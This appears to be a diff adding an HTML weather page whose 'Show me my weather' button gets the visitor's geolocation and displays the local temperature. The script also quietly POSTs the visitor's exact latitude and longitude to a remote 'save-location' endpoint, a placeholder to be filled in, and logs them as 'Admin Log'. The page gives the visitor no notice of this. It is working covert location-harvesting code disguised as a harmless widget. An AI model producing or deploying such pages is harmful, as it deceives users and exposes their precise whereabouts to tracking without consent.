@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            margin: auto;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 8px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: #fff;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .loader {
+            display: none;
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .blogs {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        .blog {
+            flex: 1;
+            margin: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            transition: transform 0.3s;
+        }
+        .blog img {
+            width: 100%;
+            height: auto;
+        }
+        .blog:hover {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Weather Information</h1>
+        <button onclick="getLocation()">Show me my weather</button>
+        <div class="loader" id="loader"></div>
+        <p id="location"></p>
+        <p id="weather"></p>
+
+        <div class="blogs">
+            <div class="blog">
+                <img src="https://via.placeholder.com/150" alt="Blog 1">
+                <a href="https://www.weather.com" target="_blank">Read more about weather trends</a>
+            </div>
+            <div class="blog">
+                <img src="https://via.placeholder.com/150" alt="Blog 2">
+                <a href="https://www.bbc.com/weather" target="_blank">Latest weather news</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function getLocation() {
+            document.getElementById("loader").style.display = "block";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
+                document.getElementById("loader").style.display = "none";
+            }
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+
+            // Fetch weather information and send data to the server
+            fetchWeatherAndSendData(latitude, longitude);
+        }
+
+        function showError(error) {
+            document.getElementById("loader").style.display = "none";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("location").innerHTML = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("location").innerHTML = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("location").innerHTML = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("location").innerHTML = "An unknown error occurred.";
+                    break;
+            }
+        }
+
+        function fetchWeatherAndSendData(latitude, longitude) {
+            var weatherApiUrl = `https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`;
+            var serverApiUrl = 'https://your-server-endpoint.com/save-location'; // Update with your server URL
+
+            // Fetch weather information
+            fetch(weatherApiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    var temperature = data.current_weather.temperature;
+                    var weatherDescription = data.current_weather.weathercode;
+                    document.getElementById("weather").innerHTML = `Temperature: ${temperature}°C <br> Weather Code: ${weatherDescription}`;
+
+                    // Log location and weather data in the console
+                    console.log("Admin Log - Latitude: " + latitude);
+                    console.log("Admin Log - Longitude: " + longitude);
+                    console.log("Admin Log - Weather Data: ", data);
+
+                    // Send location data to the server
+                    fetch(serverApiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            latitude: latitude,
+                            longitude: longitude,
+                            weather: data.current_weather
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        console.log('Server Response:', result);
+                    })
+                    .catch(error => {
+                        console.log('Error sending data to server:', error);
+                    });
+                })
+                .catch(error => {
+                    document.getElementById("weather").innerHTML = "Unable to retrieve weather information.";
+                    console.log("Admin Log - Error: Unable to retrieve weather information.", error);
+                })
+                .finally(() => {
+                    document.getElementById("loader").style.display = "none";
+                });
+        }
+    </script>
+</body>
+</html>
